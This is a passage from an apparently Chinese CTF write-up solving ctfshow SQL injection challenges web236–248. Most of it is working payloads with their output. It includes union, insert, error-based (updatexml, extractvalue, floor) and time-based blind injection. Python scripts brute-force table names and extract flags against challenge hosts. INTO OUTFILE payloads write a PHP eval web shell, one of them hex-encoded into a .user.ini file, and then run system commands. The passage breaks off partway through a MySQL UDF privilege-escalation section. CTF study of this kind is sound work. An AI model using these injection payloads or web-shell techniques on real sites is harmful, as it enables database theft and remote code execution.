class="operator">=</span>\<span class="operator">&amp;</span>username<span class="operator">=</span>,username<span class="operator">=</span>(<span class="keyword">select</span> to_base64(b) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> b,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> flaga limit <span class="number">1</span>,<span class="number">1</span>)a)<span class="comment">--+</span></span><br><span class="line">Y3Rmc2hvd3tkOTQyOTcxNC00MTA2LTRkMjItYjg0YS01ODFiOTIzOWI2MGJ9</span><br><span class="line">ctfshow&#123;d9429714<span class="number">-4106</span><span class="number">-4</span>d22<span class="operator">-</span>b84a<span class="number">-581</span>b9239b60b&#125;</span><br></pre></td></tr></table></figure><h1 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h1><h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><p>记得抓包，不是原来的那个api接口了，而是：<code>/api/insert.php</code><br>其余的都相同。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">7</span><span class="string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()));--+&amp;password=2</span></span><br><span class="line"><span class="string">banlist,ctfshow_user,flag</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">7</span><span class="string">&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;));--+&amp;password=2</span></span><br><span class="line"><span class="string">id,flagass23s3,info</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">6</span><span class="string">&#x27;,(select flagass23s3 from flag));--+&amp;password=2</span></span><br><span class="line"><span class="string">ctfshow&#123;5efc59c3-4a93-4d07-a546-5a702b6c57c1&#125;</span></span><br></pre></td></tr></table></figure><h1 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h1><h3 id="insert-过滤空格"><a href="#insert-过滤空格" class="headerlink" title="insert 过滤空格"></a>insert 过滤空格</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">3</span><span class="string">&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#&amp;password=1</span></span><br><span class="line"><span class="string">banlist,ctfshow_user,flagb</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">3</span><span class="string">&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;</span>flagb<span class="string">&#x27;)));#&amp;password=1</span></span><br><span class="line"><span class="string">id,flag,info</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">3</span><span class="string">&#x27;,(select(flag)from(flagb)));#&amp;password=1</span></span><br><span class="line"><span class="string">ctfshow&#123;be8f3e4a-b6a0-4747-80d3-91979ef33988&#125;</span></span><br></pre></td></tr></table></figure><h1 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h1><h3 id="过滤空格-or"><a href="#过滤空格-or" class="headerlink" title="过滤空格 or"></a>过滤空格 or</h3><p>相同操作，只不过更换查询的表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">3</span><span class="string">&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())));#&amp;password=1</span></span><br><span class="line"><span class="string">banlist,ctfshow_user,flagbb</span></span><br></pre></td></tr></table></figure><p>这玩应把*过滤了，只能猜flag名，看了一下网上的做法基本如此。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;,(select`flag`from`flagbb`));#&amp;password=1</span></span><br><span class="line"><span class="string">ctfshow&#123;0e1b5153-fff7-48be-aca1-cef950d964a0&#125;</span></span><br></pre></td></tr></table></figure><h1 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h1><p>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写<br>意思就是让我们爆破呗。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url <span class="operator">=</span> &quot;http://a2483863-8c01-4755-a5b3-decf561e6728.challenge.ctf.show/api/insert.php&quot;</span><br><span class="line">name <span class="operator">=</span> &quot;flag&quot;</span><br><span class="line">res <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">                    res <span class="operator">=</span> name <span class="operator">+</span> a <span class="operator">+</span> b <span class="operator">+</span> c <span class="operator">+</span> d <span class="operator">+</span> e</span><br><span class="line">                    data <span class="operator">=</span> &#123;</span><br><span class="line">                        <span class="string">&#x27;username&#x27;</span>: f&quot;&#123;res&#125;&#x27;,(select(flag)from(&#123;res&#125;)))#&quot;,</span><br><span class="line">                        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;a&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    print(data)</span><br><span class="line">                    r <span class="operator">=</span> requests.post(url, data<span class="operator">=</span>data)</span><br></pre></td></tr></table></figure><p>跑完一遍之后刷新一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690546632830-eb02d773-ff79-495a-9e30-5aa8c826e14b.png" alt="image.png"></p><h1 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h1><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p>遇事不决直接上盲注：<br>目标位置<code>api/delete.php</code><br>先决定一下测试payload，直接在id中传入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(substr((database())),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,sleep(<span class="number">0.05</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这时间盲注不同设备的时间不同，根据自己调整</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"># <span class="operator">-</span><span class="operator">*</span><span class="operator">-</span> encoding: utf<span class="number">-8</span> <span class="operator">-</span><span class="operator">*</span><span class="operator">-</span></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">@File    :   SQL时间盲注1.py   </span><br><span class="line">@Contact :   2997453446@qq.com</span><br><span class="line">@Blog    :   natro92.github.io</span><br><span class="line"> </span><br><span class="line">@Modify Time      @Author    @Version    @Desciption</span><br><span class="line">------------      -------    --------    -----------</span><br><span class="line">2023/7/28 20:21   natro92      1.0        web241</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import <span class="type">time</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> tqdm import trange</span><br><span class="line"></span><br><span class="line">url <span class="operator">=</span> r<span class="string">&#x27;http://b2100936-f04f-42cf-a179-f6bb35e08972.challenge.ctf.show/api/delete.php&#x27;</span></span><br><span class="line">flag_pre <span class="operator">=</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str <span class="operator">=</span> &quot;_abcdefghijklmnopqrstuvwxyz0123456789&#123;-,&#125; &quot;</span><br><span class="line"># inside <span class="operator">=</span> <span class="string">&#x27;database()&#x27;</span></span><br><span class="line"># inside <span class="operator">=</span> <span class="string">&#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"># inside <span class="operator">=</span> <span class="string">&#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;flag&quot;&#x27;</span></span><br><span class="line">inside <span class="operator">=</span> <span class="string">&#x27;substr((select group_concat(flag) from flag),9,36)&#x27;</span></span><br><span class="line"></span><br><span class="line">payload <span class="operator">=</span> &quot;if(substr((&#123;&#125;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(0.05),0)&quot;</span><br><span class="line">res <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">last</span> <span class="operator">=</span> <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">1</span>, <span class="number">37</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data <span class="operator">=</span> &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload.format(inside, i, j),</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            # print(data)</span><br><span class="line">            r <span class="operator">=</span> requests.post(url, data<span class="operator">=</span>data, timeout<span class="operator">=</span><span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">last</span> <span class="operator">=</span> res</span><br><span class="line">            res <span class="operator">+</span><span class="operator">=</span> j</span><br><span class="line">            # print(res)</span><br><span class="line">            break</span><br><span class="line">        if <span class="keyword">last</span> <span class="operator">=</span><span class="operator">=</span> res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>网络的好坏决定着你在这个途中是否会出现错误。尽量减少位数的盲注，知道的前缀就别注了。</p><h1 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h1><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctfshow_user <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/dump/&#123;$filename&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="字段分隔符"><a href="#字段分隔符" class="headerlink" title="字段分隔符"></a>字段分隔符</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FIELDS TERMINATED <span class="keyword">BY</span>‘,‘字段间分割符</span><br><span class="line">OPTIONALLY ENCLOSED <span class="keyword">BY</span>‘&quot;‘将字段包围 对数值型无效</span><br></pre></td></tr></table></figure><p>相关参考：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;file_name&#x27;</span></span><br><span class="line">        [<span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">        [export_options]</span><br><span class="line"> </span><br><span class="line">export_options:</span><br><span class="line">    [&#123;FIELDS <span class="operator">|</span> COLUMNS&#125;</span><br><span class="line">        [TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;string&#x27;</span>]<span class="operator">/</span><span class="operator">/</span>分隔符</span><br><span class="line">        [[OPTIONALLY] ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;char&#x27;</span>]</span><br><span class="line">        [ESCAPED <span class="keyword">BY</span> <span class="string">&#x27;char&#x27;</span>]</span><br><span class="line">    ]</span><br><span class="line">    [LINES</span><br><span class="line">        [STARTING <span class="keyword">BY</span> <span class="string">&#x27;string&#x27;</span>]</span><br><span class="line">        [TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;string&#x27;</span>]</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************************************************/</span></span><br><span class="line"></span><br><span class="line">“OPTION”参数为可选参数选项，其可能的取值有：</span><br><span class="line"> </span><br><span class="line">`FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;字符串&#x27;</span>`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。</span><br><span class="line"> </span><br><span class="line">`FIELDS ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;字符&#x27;</span>`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。</span><br><span class="line"> </span><br><span class="line">`FIELDS OPTIONALLY ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;字符&#x27;</span>`：设置字符来括住<span class="type">CHAR</span>、<span class="type">VARCHAR</span>和TEXT等字符型字段。默认情况下不使用任何符号。</span><br><span class="line"> </span><br><span class="line">`FIELDS ESCAPED <span class="keyword">BY</span> <span class="string">&#x27;字符&#x27;</span>`：设置转义字符，只能为单个字符。默认值为“\”。</span><br><span class="line"> </span><br><span class="line">`LINES STARTING <span class="keyword">BY</span> <span class="string">&#x27;字符串&#x27;</span>`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。</span><br><span class="line"> </span><br><span class="line">`LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;字符串&#x27;</span>`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>比如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">into</span> outfile &quot;位置&quot; fileds terminated <span class="keyword">by</span> <span class="string">&#x27;写入内容&#x27;</span></span><br></pre></td></tr></table></figure><p>当然换行符也可以使用。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>备份表</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select * from ctfshow_user into outfile &#x27;/var/www/html/dump/&#123;$filename&#125;&#x27;;&quot;;</span><br></pre></td></tr></table></figure><p>我们直接使用测试木马接口位置<code>/api/dump.php</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename<span class="operator">=</span><span class="number">1.</span>php<span class="string">&#x27; fields terminated by &#x27;</span><span class="operator">&lt;</span>?php eval($_REQUEST[<span class="number">1</span>]);?<span class="operator">&gt;</span><span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p>然后访问<code>/dump/1.php</code><br>get或post传参：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">=</span><span class="keyword">system</span>(<span class="string">&#x27;cat /flag.here&#x27;</span>);</span><br></pre></td></tr></table></figure><h1 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h1><h3 id="sql加文件上传图片马"><a href="#sql加文件上传图片马" class="headerlink" title="sql加文件上传图片马"></a>sql加文件上传图片马</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xa6175746f5f70726570656e645f66696c653d312e6a7067</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> </span><br><span class="line">\nauto_prepend_file<span class="operator">=</span><span class="number">1.</span>jpg</span><br></pre></td></tr></table></figure><p>首先先传入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename<span class="operator">=</span><span class="number">1.</span>jpg<span class="string">&#x27; LINES TERMINATED BY 0xa6175746f5f70726570656e645f66696c653d312e6a7067</span></span><br></pre></td></tr></table></figure><p>再传入<code>.user.ini</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename<span class="operator">=</span>.user.ini<span class="string">&#x27; LINES TERMINATED BY 0x0A6175746F5F70726570656E645F66696C653D67796C712E6A70670A#</span></span><br><span class="line"><span class="string">其中0x0A6175746F5F70726570656E645F66696C653D67796C712E6A70670A是&lt;?php eval($_REQUEST[1]);?&gt;</span></span><br></pre></td></tr></table></figure><p>然后访问：<code>dump/index.php</code><br>传入命令即可。<code>1=system(&#39;cat /flag.here&#39;);</code></p><h1 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h1><h3 id="报错注入-updatexml"><a href="#报错注入-updatexml" class="headerlink" title="报错注入 updatexml"></a>报错注入 updatexml</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>备份表</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;.$id.&quot;&#x27; limit 1;&quot;;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>无过滤</span><br></pre></td></tr></table></figure><p>用updatexml报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>api<span class="operator">/</span>?id<span class="operator">=</span><span class="string">&#x27; or updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+</span></span><br><span class="line"><span class="string">banlist,ctfshow_flag,ctfshow_use</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="string">&#x27; or updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_flag<span class="string">&#x27;)),1) -- A</span></span><br><span class="line"><span class="string">id,flag,info</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag太长需要查两遍：</span><br><span class="line">api<span class="operator">/</span>?id<span class="operator">=</span><span class="string">&#x27; or updatexml(1,concat(1,(select mid(flag,1,30) from ctfshow_flag)),1) --+</span></span><br><span class="line"><span class="string">api/?id=&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">1</span>,(<span class="keyword">select</span> mid(flag,<span class="number">20</span>,<span class="number">30</span>) <span class="keyword">from</span> ctfshow_flag)),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>然后拼起来：<br>ctfshow{99150aa0-0cf6-4537-ad52-3043e2647334}</p><h1 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h1><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>用法类似，这里不多赘述了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">api<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)); --+</span></span><br><span class="line"><span class="string">banlist,ctfshow_flagsa,ctfshow_</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">api<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_flagsa<span class="string">&#x27;),0x7e)); --+</span></span><br><span class="line"><span class="string">id,flag1,info</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">api<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1,concat(0x7e,(select right(flag1,45) from ctfshow_flagsa),0x7e)); --+</span></span><br><span class="line"><span class="string">ctfshow&#123;1eaee386-fce7-49d8-86fd</span></span><br><span class="line"><span class="string">api/?id=1&#x27;</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">right</span>(flag1,<span class="number">30</span>) <span class="keyword">from</span> ctfshow_flagsa),<span class="number">0x7e</span>)); <span class="comment">--+</span></span><br><span class="line"><span class="number">6</span><span class="operator">-</span>fce7<span class="number">-49</span>d8<span class="number">-86</span>fd<span class="number">-15</span>c29674ed78&#125;</span><br></pre></td></tr></table></figure><p>ctfshow{1eaee386-fce7-49d8-86fd-15c29674ed78}</p><h1 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h1><blockquote><p><a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/wzy-ustc/p/14217750.html">https://www.cnblogs.com/wzy-ustc/p/14217750.html</a><br><a href="https://links.jianshu.com/go?to=https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html">https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html</a></p></blockquote><h3 id="floor双查询"><a href="#floor双查询" class="headerlink" title="floor双查询"></a>floor双查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查表名</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A</span></span><br><span class="line"><span class="string">//查列名</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;ctfshow_flags&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">-- A</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查数据</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,count(*),concat((select flag2 from ctfshow_flags),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A</span></span><br></pre></td></tr></table></figure><p>需要二次上传才会出现结果</p><h1 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h1><h3 id="ceil代替floor"><a href="#ceil代替floor" class="headerlink" title="ceil代替floor"></a>ceil代替floor</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;.$id.&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p>使用ceil()(向上取整)代替floor()。当然也可以使用round()：<br>ROUND(X) – 表示将值 X 四舍五入为整数，无小数位<br>ROUND(X,D) – 表示将值 X 四舍五入为小数点后 D 位的数值，D为小数点后小数位数。若要保留 X 值小数点左边的 D 位，可将 D 设为负值。<br>最后的payload是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,count(*),concat((select `flag?` from ctfshow_flagsa),0x7e,ceil(rand()*2))a from information_schema.tables group by a-- A</span></span><br></pre></td></tr></table></figure><p>可以看到这个字段名flag?加了反引号，原因是：<br>表名和字段名都可以用反引号引起来，这是用来区分MYSQL的保留字与普通字符。 表名、字段名、数据库名等可用反引号 ( ` )，也可以不使用反引号 ，但如果它包含特殊字符或保留字，则必须使用，如果不使用就会报错。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690557907870-84c2d526-6b51-41e6-9887-7731d9ddac80.png" alt="image.png"></p><h1 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h1><h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><blockquote><p><a href="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/">https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/</a><br><a href="https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%B8%89%E3%80%81MYSQL-UDF-%E6%8F%90%E6%9D%83">https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%B8%89%E3%80%81MYSQL-UDF-%E6%8F%90%E6%9D%83</a><br><a href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a><br><a href="https://blog.csdn.net/qq_35938621/article/details/119846053">https://blog.csdn.net/qq_35938621/article/details/119846053</a> 这里讲了详细步骤 建议看看</p></blockquote><p>UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 